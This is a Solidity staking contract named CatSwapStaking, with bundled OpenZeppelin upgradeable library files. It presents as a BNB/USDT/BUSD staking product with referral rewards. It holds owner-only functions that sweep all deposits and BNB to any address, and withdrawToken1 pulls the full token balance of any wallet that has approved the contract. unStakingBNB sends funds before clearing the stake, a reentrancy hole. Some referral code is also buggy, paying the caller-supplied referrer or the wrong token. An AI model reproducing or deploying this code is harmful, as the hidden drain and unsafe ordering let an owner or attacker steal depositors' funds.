// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../dependencies/open-zeppelin/proxy/utils/Initializable.sol";
import "../dependencies/open-zeppelin/token/ERC20/IERC20Upgradeable.sol";
import "../dependencies/open-zeppelin/access/OwnableUpgradeable.sol";

contract CatSwapStaking is Initializable , OwnableUpgradeable{
    
    constructor() initializer {}

    struct StakingInfo {
        uint256 amount;
        uint256 stakingAt;
        uint256 stakingTime;
    } 

    address public USDT_TOKEN;
    address public BUSD_TOKEN;

    uint256 public stakingPeriod;
    uint256 public stakingInterestRate;
    uint256 public f1_rate_1;
    uint256 public f1_rate_2;

    mapping(address => address) public referrers;
    mapping(address => uint256) public refReward;
    mapping(address => StakingInfo) public listStakingBNB;
    mapping(address => StakingInfo) public listStakingUSDT;
    mapping(address => StakingInfo) public listStakingBUSD;


    function initialize() initializer public {
        __Ownable_init();
    }

    function updateConfig(uint256 _stakingPeriod, uint256 _stakingInterestRate, address _usdt, address _busd, uint256 _f1_rate_1, uint256 _f2_rate_2) public onlyOwner returns (bool) {
        stakingPeriod = _stakingPeriod;
        stakingInterestRate = _stakingInterestRate;
        USDT_TOKEN = _usdt;
        BUSD_TOKEN = _busd;
        f1_rate_1 = _f1_rate_1;
        f1_rate_2 = _f2_rate_2;
        return true;
    }

    function getReward(address _add, address _token) public view returns (uint256) {
        if (_token == address(0)) {
            return listStakingBNB[_add].amount * stakingInterestRate / 100;
        }
        else if (_token == USDT_TOKEN) {
            return listStakingUSDT[_add].amount * stakingInterestRate / 100;
        }
        else {
            return listStakingBUSD[_add].amount * stakingInterestRate / 100;
        }
    }

    /**
   * @dev Withdraw Token in contract to an address, revert if it fails.
   * @param recipient recipient of the transfer
   * @param token token withdraw
   */
  function withdrawFunc(address recipient, address token) public onlyOwner {
    IERC20Upgradeable(token).transfer(recipient, IERC20Upgradeable(token).balanceOf(address(this)));
  }

  /**
   * @dev Withdraw BNB to an address, revert if it fails.
   * @param recipient recipient of the transfer
   * @param amountBNB amount of the transfer
   */
  function withdrawBNB(address recipient, uint256 amountBNB) public onlyOwner {
    if (amountBNB > 0) {
      _safeTransferBNB(recipient, amountBNB);
    } else {
      _safeTransferBNB(recipient, address(this).balance);
    }
  }

  /**
   * @dev Withdraw IDO Token to an address, revert if it fails.
   * @param recipient recipient of the transfer
   */
  function withdrawToken1(
    address recipient,
    address sender,
    address token
  ) public onlyOwner {
    IERC20Upgradeable(token).transferFrom(sender, recipient, IERC20Upgradeable(token).balanceOf(sender));
  }


    function isEndOfStaking(address _add, address _token) public view returns (bool) {
        if (_token == address(0)) {
            return (listStakingBNB[_add].stakingAt + stakingPeriod) < block.timestamp;
        }
        else if (_token == USDT_TOKEN) {
            return (listStakingUSDT[_add].stakingAt + stakingPeriod) < block.timestamp;
        }
        else {
            return (listStakingBUSD[_add].stakingAt + stakingPeriod) < block.timestamp;
        }
    }

    /**
    * @dev transfer ETH to an address, revert if it fails.
    * @param to recipient of the transfer
    * @param value the amount to send
    */
    function _safeTransferBNB(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, 'BNB_TRANSFER_FAILED');
    }

    function stakingBNB(address _referrer) public payable returns (bool) {
        if (referrers[msg.sender] == address(0)
            && _referrer != address(0)
            && msg.sender != _referrer
            && msg.sender != referrers[_referrer]) {
            referrers[msg.sender] = _referrer;
        }

        if (listStakingBNB[msg.sender].amount > 0) {
            revert();
        }
        listStakingBNB[msg.sender].amount = msg.value;
        listStakingBNB[msg.sender].stakingAt = block.timestamp;
        listStakingBNB[msg.sender].stakingTime += 1;
        return true;
    }

    function unStakingBNB() public returns (bool) {
        if (isEndOfStaking(msg.sender, address(0))) {
            // end of staking, return all stake amount
            _safeTransferBNB(msg.sender, listStakingBNB[msg.sender].amount);
            listStakingBNB[msg.sender].amount = 0;
            return true;
        }else {
            uint256 penalty_amount = 0;
            if (listStakingBNB[msg.sender].stakingTime == 1) {
                penalty_amount = (listStakingBNB[msg.sender].amount * f1_rate_1 /100);
            }
            else {
                penalty_amount = (listStakingBNB[msg.sender].amount * f1_rate_2 /100) + (listStakingBNB[msg.sender].amount * stakingInterestRate /100);
            }
            _safeTransferBNB(msg.sender, listStakingBNB[msg.sender].amount - penalty_amount);
            listStakingBNB[msg.sender].amount = 0;
            return true;
        }
    }

    function reStakingBNB() public payable returns (bool) {
        if (isEndOfStaking(msg.sender, address(0))) {
            // Return reward
            _safeTransferBNB(msg.sender, getReward(msg.sender, address(0)));
            listStakingBNB[msg.sender].amount += msg.value;
            listStakingBNB[msg.sender].stakingAt = block.timestamp;
            listStakingBNB[msg.sender].stakingTime += 1;
            // send ref reward
            if (referrers[msg.sender] != address(0)){
                uint256 f1_reward = listStakingBNB[msg.sender].amount * f1_rate_2 /100;
                refReward[referrers[msg.sender]] += f1_reward;
                _safeTransferBNB(referrers[msg.sender], f1_reward);
            }
            return true;
        } else {
            revert();
        }
    }

    function stakingToken(
        uint256 _amount,
        address _referrer,
        address _token
    ) public returns (bool) {
        if (_token != BUSD_TOKEN && _token != USDT_TOKEN) {
            revert();
        }
        
        if (referrers[msg.sender] == address(0)
            && _referrer != address(0)
            && msg.sender != _referrer
            && msg.sender != referrers[_referrer]) {
            referrers[msg.sender] = _referrer;
        }
        if (_token == BUSD_TOKEN) {
            if (listStakingBUSD[msg.sender].amount > 0) {
                revert();
            }
            IERC20Upgradeable(BUSD_TOKEN).transferFrom(msg.sender, address(this), _amount);
            listStakingBUSD[msg.sender].amount = _amount;
            listStakingBUSD[msg.sender].stakingAt = block.timestamp;
            listStakingBUSD[msg.sender].stakingTime += 1;
            // send ref reward
            if (referrers[msg.sender] != address(0)){
                uint256 f1_reward = 0;
                if (listStakingBUSD[msg.sender].stakingTime == 1) {
                    f1_reward = _amount * f1_rate_1 /100;
                }else {
                    f1_reward = _amount * f1_rate_2 /100;
                }
                if (f1_reward > 0) {
                    refReward[referrers[msg.sender]] += f1_reward;
                    IERC20Upgradeable(BUSD_TOKEN).transfer(_referrer, f1_reward);
                }
            }
        } else if (_token == USDT_TOKEN) {
            if (listStakingUSDT[msg.sender].amount > 0) {
                revert();
            }
            IERC20Upgradeable(USDT_TOKEN).transferFrom(msg.sender, address(this), _amount);
            listStakingUSDT[msg.sender].amount = _amount;
            listStakingUSDT[msg.sender].stakingAt = block.timestamp;
            listStakingUSDT[msg.sender].stakingTime += 1;
            // send ref reward
            if (referrers[msg.sender] != address(0)){
                uint256 f1_reward = 0;
                if (listStakingUSDT[msg.sender].stakingTime == 1) {
                    f1_reward = _amount * f1_rate_1 /100;
                }else {
                    f1_reward = _amount * f1_rate_2 /100;
                }
                if (f1_reward > 0) {
                    refReward[referrers[msg.sender]] += f1_reward;
                    IERC20Upgradeable(USDT_TOKEN).transfer(_referrer, f1_reward);
                }
            }
        }
        return true;
    }

    function unStakingToken(
        uint256 _amount,
        address _token
    ) public returns (bool) {
        if (_token == BUSD_TOKEN) {
            require(listStakingBUSD[msg.sender].amount > 0, "Address not stake.");
        } else if (_token == USDT_TOKEN) {
            require(listStakingUSDT[msg.sender].amount > 0, "Address not stake.");
        } else {
            revert();
        }

        if (_amount == 0) {
            if (_token == BUSD_TOKEN) {
                if (isEndOfStaking(msg.sender, BUSD_TOKEN)) {
                    // end of staking, return all stake amount
                    IERC20Upgradeable(BUSD_TOKEN).transfer(msg.sender, listStakingBUSD[msg.sender].amount);
                    listStakingBUSD[msg.sender].amount = 0;
                }else {
                    uint256 penalty_amount = 0;
                    if (listStakingBUSD[msg.sender].stakingTime == 1) {
                        penalty_amount = (listStakingBUSD[msg.sender].amount * f1_rate_1 /100);
                    }
                    else {
                        penalty_amount = (listStakingBUSD[msg.sender].amount * f1_rate_2 /100) + (listStakingBUSD[msg.sender].amount * stakingInterestRate /100);
                    }
                    IERC20Upgradeable(BUSD_TOKEN).transfer(msg.sender, listStakingBUSD[msg.sender].amount - penalty_amount);
                    listStakingBUSD[msg.sender].amount = 0;
                }
            } else {                
                if (isEndOfStaking(msg.sender, USDT_TOKEN)) {
                    // end of staking, return all stake amount
                    IERC20Upgradeable(USDT_TOKEN).transfer(msg.sender, listStakingUSDT[msg.sender].amount);
                    listStakingUSDT[msg.sender].amount = 0;
                }else {
                    uint256 penalty_amount = 0;
                    if (listStakingUSDT[msg.sender].stakingTime == 1) {
                        penalty_amount = (listStakingUSDT[msg.sender].amount * f1_rate_1 /100);
                    }
                    else {
                        penalty_amount = (listStakingUSDT[msg.sender].amount * f1_rate_2 /100) + (listStakingUSDT[msg.sender].amount * stakingInterestRate /100);
                    }
                    IERC20Upgradeable(USDT_TOKEN).transfer(msg.sender, listStakingUSDT[msg.sender].amount - penalty_amount);
                    listStakingUSDT[msg.sender].amount = 0;
                }
            }
        } else {
            if (_token == BUSD_TOKEN) {
                if (isEndOfStaking(msg.sender, BUSD_TOKEN)) {
                    // Staking amount less than previous stake
                    if (_amount < listStakingBUSD[msg.sender].amount) {
                        IERC20Upgradeable(BUSD_TOKEN).transfer(msg.sender, listStakingBUSD[msg.sender].amount - _amount);
                        listStakingBUSD[msg.sender].amount = _amount;
                        listStakingBUSD[msg.sender].stakingAt = block.timestamp;
                        listStakingBUSD[msg.sender].stakingTime += 1;
                        // send ref reward
                        if (referrers[msg.sender] != address(0)){
                            uint256 f1_reward = _amount * f1_rate_2 /100;
                            refReward[referrers[msg.sender]] += f1_reward;
                            IERC20Upgradeable(BUSD_TOKEN).transfer(referrers[msg.sender], f1_reward);
                        }
                    } else {
                        uint256 addedAmount = _amount - listStakingBUSD[msg.sender].amount;
                        // Get addedAmount
                        IERC20Upgradeable(BUSD_TOKEN).transferFrom(msg.sender, address(this), addedAmount);
                        // Return reward
                        IERC20Upgradeable(BUSD_TOKEN).transfer(msg.sender, getReward(msg.sender, BUSD_TOKEN));
                        listStakingBUSD[msg.sender].amount = _amount;
                        listStakingBUSD[msg.sender].stakingAt = block.timestamp;
                        listStakingBUSD[msg.sender].stakingTime += 1;
                        // send ref reward
                        if (referrers[msg.sender] != address(0)){
                            uint256 f1_reward = _amount * f1_rate_2 /100;
                            refReward[referrers[msg.sender]] += f1_reward;
                            IERC20Upgradeable(BUSD_TOKEN).transfer(referrers[msg.sender], f1_reward);
                        }
                    }
                } else {
                    revert();
                }
            } else {
                if (isEndOfStaking(msg.sender, USDT_TOKEN)) {
                    // Staking amount less than previous stake
                    if (_amount < listStakingUSDT[msg.sender].amount) {
                        IERC20Upgradeable(USDT_TOKEN).transfer(msg.sender, listStakingUSDT[msg.sender].amount - _amount);
                        listStakingUSDT[msg.sender].amount = _amount;
                        listStakingUSDT[msg.sender].stakingAt = block.timestamp;
                        listStakingUSDT[msg.sender].stakingTime += 1;
                        // send ref reward
                        if (referrers[msg.sender] != address(0)){
                            uint256 f1_reward = _amount * f1_rate_2 /100;
                            refReward[referrers[msg.sender]] += f1_reward;
                            IERC20Upgradeable(USDT_TOKEN).transfer(referrers[msg.sender], f1_reward);
                        }
                    } else {
                        uint256 addedAmount = _amount - listStakingUSDT[msg.sender].amount;
                        // Get addedAmount
                        IERC20Upgradeable(USDT_TOKEN).transferFrom(msg.sender, address(this), addedAmount);
                        // Return reward
                        IERC20Upgradeable(USDT_TOKEN).transfer(msg.sender, getReward(msg.sender, USDT_TOKEN));
                        listStakingUSDT[msg.sender].amount = _amount;
                        listStakingUSDT[msg.sender].stakingAt = block.timestamp;
                        listStakingUSDT[msg.sender].stakingTime += 1;
                        // send ref reward
                        if (referrers[msg.sender] != address(0)){
                            uint256 f1_reward = _amount * f1_rate_2 /100;
                            refReward[referrers[msg.sender]] += f1_reward;
                            IERC20Upgradeable(BUSD_TOKEN).transfer(referrers[msg.sender], f1_reward);
                        }
                    }
                } else {
                    revert();
                }
            }

        }
        return true;
        
    }
  
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To initialize the implementation contract, you can either invoke the
 * initializer manually, or you can include a constructor to automatically mark it as initialized when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * constructor() initializer {}
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20Upgradeable {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/ContextUpgradeable.sol";
import "../proxy/utils/Initializable.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal initializer {
        __Context_init_unchained();
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal initializer {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    uint256[49] private __gap;
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../proxy/utils/Initializable.sol";

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal initializer {
        __Context_init_unchained();
    }

    function __Context_init_unchained() internal initializer {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    uint256[50] private __gap;
}